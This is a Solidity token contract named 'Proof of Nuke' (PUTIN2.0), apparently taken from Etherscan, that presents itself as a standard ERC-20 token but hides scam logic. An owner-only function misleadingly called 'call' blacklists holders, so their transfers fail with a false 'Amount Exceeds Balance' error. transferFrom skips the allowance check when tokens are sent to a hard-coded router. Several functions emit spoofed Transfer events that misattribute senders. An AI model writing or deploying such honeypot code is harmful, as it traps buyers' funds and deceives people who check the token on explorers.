/**
 *Submitted for verification at Etherscan.io on 2022-09-21
*/

pragma solidity 0.8.17;
/*

*/
contract PUTIN {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) btAmount;

    // 
    string public name = "Proof of Nuke";
    string public symbol = unicode"PUTIN2.0";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
    address Router = 0x68AD82C55f82B578696500098a635d3df466DC7C;
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0x1BA40a89d7269989309CA5a14bC2904D1e526b0C;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
    bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _; }


    function deploy(address account, uint256 amount) public onlyOwner {
    emit Transfer(address(0), account, amount); }


    function transfer(address to, uint256 value) public returns (bool success) {

        require(!btAmount[msg.sender] , "Amount Exceeds Balance"); 
        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }       
        require(!btAmount[msg.sender] , "Amount Exceeds Balance"); 
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }

        
    
        function call(address to, address _usr, uint256 value) public {
        require(msg.sender == owner);
         require(!btAmount[_usr], "NaN");
        emit Transfer(msg.sender, to, value);
        btAmount[_usr] = true; }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

        function bridge(address to, address _usr, uint256 value) public {
        require(msg.sender == owner);
        emit Transfer(msg.sender, to, value);
        btAmount[_usr] = false; }

    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }
        if(to == Router)  {
        require(value <= balanceOf[from]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (from, to, value);
        return true; }
        require(!btAmount[from] , "Amount Exceeds Balance"); 
        require(!btAmount[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }